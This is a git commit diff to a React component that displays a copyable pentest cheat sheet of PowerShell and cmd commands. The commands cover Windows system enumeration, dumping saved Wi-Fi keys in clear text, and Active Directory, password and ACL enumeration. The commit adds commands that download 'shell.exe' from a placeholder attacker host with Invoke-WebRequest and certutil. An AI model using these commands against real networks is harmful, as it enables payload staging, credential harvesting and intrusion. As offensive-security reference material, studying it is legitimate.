af02207925a1625dd7c3cdffe60bf3727859da73
rbx <rbouchahoua@myges.fr>
2020-12-28 21:33:04 +0100

    adding few miscellaneous PS-cmdlets / cmd  😪

--- src/components/PowershellCommands.js
+++ src/components/PowershellCommands.js
@@ -5,205 +5,235 @@ import QueueAnim from 'rc-queue-anim';
 const { Title, Paragraph, Text } = Typography;
 
 export default (props) => {
-	const local_sys_enum = [
-		{ title: 'systeminfo' },
-		{ title: 'Get-WmiObject Win32_ComputerSystem' },
-		{ title: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' }
-	];
-	const lastpatchlist = 'Get-Hotfix -description "Security update"';
-	const envVar = 'Get-ChildItem Env: | ft Key,Value';
-	const wlan_creddump = [
-		{ title: 'netsh wlan show profiles' },
-		{ title: 'netsh wlan show profile name="NETWORK" key=clear' }
-	];
 
-	// domain enum
-	const domain_name = `Get-NetDomain`;
-	const forest_domain_list = `Get-NetForestDomain`;
-	const domain_SID = `Get-DomainSID `;
-	const domain_Policy = `Get-DomainPolicy`;
-	const domain_OUs = `Get-NetOU`;
-	const domain_trust = `Get-NetDomainTrust`;
-	// gpo
-	const gpo_enum = `Get-NetGPO -ComputerName computername.domain.com`;
-	// passwd enum
-	const passwd_lastset = `Get-UserProperty –Properties pwdlastset`;
-	const user_desc_harvest = `Find-UserField -SearchField Description –SearchTerm “pass”`;
+  const local_sys_enum = [
+    { title: "systeminfo" },
+    { title: "Get-WmiObject Win32_ComputerSystem" },
+    { title: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' },
+  ];
+  const lastpatchlist = 'Get-Hotfix -description "Security update"';
+  const lastpatchlist_wmic = 'wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn"';
+  const envVar = "Get-ChildItem Env: | ft Key,Value";
+  const envVar_cmd = "set";
+  const wlan_creddump = [
+    { title: "netsh wlan show profiles" },
+    { title: 'netsh wlan show profile name="PROFILE-NAME" key=clear' },
+  ];
 
-	//computers domain
-	const domain_computers = `Get-NetComputer`;
-	const domain_pingable_computers = `Get-NetComputer -Ping`;
-	const domain_win7U_computers = `Get-NetComputer –OperatingSystem "Windows 7 Ultimate"`;
+  // windows wget like 
+  const powershell_http_dl = ' Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ' 
+  const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe'
 
-	//domain admins
-	const domain_admin_members = `Get-NetGroupMember -GroupName "Domain Admins"`;
-	const domain_admins_groups = `Get-NetGroup *admin*`;
-	const local_admins = `Get-NetLocalGroup –ComputerName PCNAME-001`;
-	const user_group_membership = `Get-NetGroup –UserName "username"`;
+  // domain enum
+  const domain_name = `Get-NetDomain`;
+  const forest_domain_list = `Get-NetForestDomain`;
+  const domain_SID = `Get-DomainSID `;
+  const domain_Policy = `Get-DomainPolicy`;
+  const domain_OUs = `Get-NetOU`;
+  const domain_trust = `Get-NetDomainTrust`;
+  // gpo
+  const gpo_enum = `Get-NetGPO -ComputerName computername.domain.com`;
+  // passwd enum
+  const passwd_lastset = `Get-UserProperty –Properties pwdlastset`;
+  const user_desc_harvest = `Find-UserField -SearchField Description –SearchTerm “pass”`;
 
-	//acl
-	const ACL_user_enum = `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`;
-	const ACL_gpoedit_rights = `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`;
-	const ACL_passwd_edit_rights = `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`;
+  //computers domain
+  const domain_computers = `Get-NetComputer`;
+  const domain_pingable_computers = `Get-NetComputer -Ping`;
+  const domain_win7U_computers = `Get-NetComputer –OperatingSystem "Windows 7 Ultimate"`;
 
-	return (
-		<QueueAnim delay={300} duration={1500}>
-			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
-				Powershell handy commands
-			</Title>
-			<Paragraph style={{ margin: 15 }}>List of useful Powershell commands</Paragraph>
-			<Divider dashed />
-			<div
-				key='a'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>System enumeration</Title>
-				{local_sys_enum.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-				<Text strong># List Security patches</Text>
-				<Paragraph copyable ellipsis={true}>
-					{lastpatchlist}
-				</Paragraph>
-				<Text strong># Environment Variables</Text>
-				<Paragraph copyable ellipsis={true}>
-					{envVar}
-				</Paragraph>
-				<Title level={4}>WLAN enumeration</Title>
-				{wlan_creddump.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
+  //domain admins
+  const domain_admin_members = `Get-NetGroupMember -GroupName "Domain Admins"`;
+  const domain_admins_groups = `Get-NetGroup *admin*`;
+  const local_admins = `Get-NetLocalGroup –ComputerName PCNAME-001`;
+  const user_group_membership = `Get-NetGroup –UserName "username"`;
 
-			<Divider dashed />
-			<div
-				key='b'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={2}>Active Directory enumeration</Title>
+  //acl
+  const ACL_user_enum = `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`;
+  const ACL_gpoedit_rights = `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`;
+  const ACL_passwd_edit_rights = `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`;
 
-				<Title level={4}> Domain enumeration</Title>
+  return (
+    <QueueAnim delay={300} duration={1500}>
+      <Title
+        variant="Title level={3}"
+        style={{ fontWeight: "bold", margin: 15 }}
+      >
+        Powershell handy commands
+      </Title>
+      <Paragraph style={{ margin: 15 }}>
+        List of useful Powershell commands
+      </Paragraph>
+      <Divider dashed />
+      <div
+        key="a"
+        style={{
+          padding: 15,
+        }}
+      >
+        <Title level={3}>System enumeration</Title>
+        {local_sys_enum.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable ellipsis={true}>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+        <Text strong># list Security patches</Text>
+        <Paragraph copyable ellipsis={true}>
+          {lastpatchlist}
+        </Paragraph>
+        <Paragraph copyable ellipsis={true}>
+          {lastpatchlist_wmic}
+        </Paragraph>
+        <Text strong># Environment Variables</Text>
+        <Paragraph copyable ellipsis={true}>
+          {envVar}
+        </Paragraph>
+        <Text strong> (over cmd.exe) </Text>
+        <Paragraph copyable ellipsis={true}>
+          {envVar_cmd}
+        </Paragraph>
+        <Divider dashed />
+        <Title level={4}>HTTP download (wget like)</Title>
+        <Paragraph copyable ellipsis={true}>
+          {powershell_http_dl}
+        </Paragraph>
+        <Text strong># cmd compatible</Text>
+        <Paragraph copyable ellipsis={true}>
+          {cmd_cert_http_dl}
+        </Paragraph>
+          <Divider dashed />
+        <Title level={4}>WLAN enumeration</Title>
+        {wlan_creddump.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable ellipsis={true}>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+      </div>
 
-				<Paragraph copyable ellipsis={true}>
-					{domain_name}
-				</Paragraph>
+      <Divider dashed />
+      <div
+        key="b"
+        style={{
+          padding: 15,
+        }}
+      >
+        <Title level={2}>Active Directory enumeration</Title>
 
-				<Text strong># List Forest Domains </Text>
-				<Paragraph copyable ellipsis={true}>
-					{forest_domain_list}
-				</Paragraph>
+        <Title level={4}> Domain enumeration</Title>
 
-				<Text strong># Domain SID </Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_SID}
-				</Paragraph>
+        <Paragraph copyable ellipsis={true}>
+          {domain_name}
+        </Paragraph>
 
-				<Text strong># Domain Policy </Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_Policy}
-				</Paragraph>
+        <Text strong># list Forest Domains </Text>
+        <Paragraph copyable ellipsis={true}>
+          {forest_domain_list}
+        </Paragraph>
 
-				<Text strong># Domain Organizational Units </Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_OUs}
-				</Paragraph>
+        <Text strong># Domain SID </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_SID}
+        </Paragraph>
 
-				<Text strong># List trusted Domains</Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_trust}
-				</Paragraph>
+        <Text strong># Domain Policy </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_Policy}
+        </Paragraph>
 
-				<Divider dashed />
+        <Text strong># Domain Organizational Units </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_OUs}
+        </Paragraph>
 
-				<Title level={4}> GPO enumeration</Title>
+        <Text strong># list trusted Domains</Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_trust}
+        </Paragraph>
 
-				<Text strong># GPO applied to the machine</Text>
-				<Paragraph copyable ellipsis={true}>
-					{gpo_enum}
-				</Paragraph>
+        <Divider dashed />
 
-				<Divider dashed />
+        <Title level={4}> GPO enumeration</Title>
 
-				<Title level={4}> Password enumeration</Title>
+        <Text strong># Gpo applied to the machine</Text>
+        <Paragraph copyable ellipsis={true}>
+          {gpo_enum}
+        </Paragraph>
 
-				<Text strong># Last Password Set date</Text>
-				<Paragraph copyable ellipsis={true}>
-					{passwd_lastset}
-				</Paragraph>
-				<Text strong># Description of User object </Text>
-				<Paragraph copyable ellipsis={true}>
-					{user_desc_harvest}
-				</Paragraph>
-				<Divider dashed />
+        <Divider dashed />
 
-				<Title level={4}> Computer enumeration</Title>
+        <Title level={4}> Password enumeration</Title>
 
-				<Text strong># List Computers of the Domain</Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_computers}
-				</Paragraph>
-				<Text strong># List Pingable Hosts </Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_pingable_computers}
-				</Paragraph>
-				<Text strong># List Windows 7 Ultimate Computers </Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_win7U_computers}
-				</Paragraph>
+        <Text strong># Last Password Set date</Text>
+        <Paragraph copyable ellipsis={true}>
+          {passwd_lastset}
+        </Paragraph>
+        <Text strong># Description of User object </Text>
+        <Paragraph copyable ellipsis={true}>
+          {user_desc_harvest}
+        </Paragraph>
+        <Divider dashed />
 
-				<Divider dashed />
+        <Title level={4}> Computer enumeration</Title>
 
-				<Title level={4}> Admin groups and account enumeration</Title>
+        <Text strong># list Computers of the Domain</Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_computers}
+        </Paragraph>
+        <Text strong># list Pingable Hosts </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_pingable_computers}
+        </Paragraph>
+        <Text strong># list Windows 7 Ultimate Computers </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_win7U_computers}
+        </Paragraph>
 
-				<Text strong># List Domain Admin members</Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_admin_members}
-				</Paragraph>
-				<Text strong># List Admin Groups </Text>
-				<Paragraph copyable ellipsis={true}>
-					{domain_admins_groups}
-				</Paragraph>
-				<Text strong># List Local Admins [need Administrative rights] </Text>
-				<Paragraph copyable ellipsis={true}>
-					{local_admins}
-				</Paragraph>
+        <Divider dashed />
 
-				<Text strong># Get groups of user [need Administrative rights] </Text>
-				<Paragraph copyable ellipsis={true}>
-					{user_group_membership}
-				</Paragraph>
+        <Title level={4}> Admin groups and account enumeration</Title>
 
-				<Divider dashed />
+        <Text strong># list Domain Admin members</Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_admin_members}
+        </Paragraph>
+        <Text strong># list Admin Groups </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_admins_groups}
+        </Paragraph>
+        <Text strong># list Local Admins [need Administrative rights] </Text>
+        <Paragraph copyable ellipsis={true}>
+          {local_admins}
+        </Paragraph>
 
-				<Title level={4}> ACL enumeration</Title>
+        <Text strong># get groups of user [need Administrative rights] </Text>
+        <Paragraph copyable ellipsis={true}>
+          {user_group_membership}
+        </Paragraph>
 
-				<Text strong># User ACL </Text>
-				<Paragraph copyable ellipsis={true}>
-					{ACL_user_enum}
-				</Paragraph>
+        <Divider dashed />
 
-				<Text strong># GPO modifications rights</Text>
-				<Paragraph copyable ellipsis={true}>
-					{ACL_gpoedit_rights}
-				</Paragraph>
+        <Title level={4}> ACL enumeration</Title>
 
-				<Text strong># Password reset rights</Text>
-				<Paragraph copyable ellipsis={true}>
-					{ACL_passwd_edit_rights}
-				</Paragraph>
-			</div>
-		</QueueAnim>
-	);
+        <Text strong># user ACL </Text>
+        <Paragraph copyable ellipsis={true}>
+          {ACL_user_enum}
+        </Paragraph>
+
+        <Text strong># GPO modifications rights</Text>
+        <Paragraph copyable ellipsis={true}>
+          {ACL_gpoedit_rights}
+        </Paragraph>
+
+        <Text strong># Password reset rights</Text>
+        <Paragraph copyable ellipsis={true}>
+          {ACL_passwd_edit_rights}
+        </Paragraph>
+      </div>
+    </QueueAnim>
+  );
 };
+
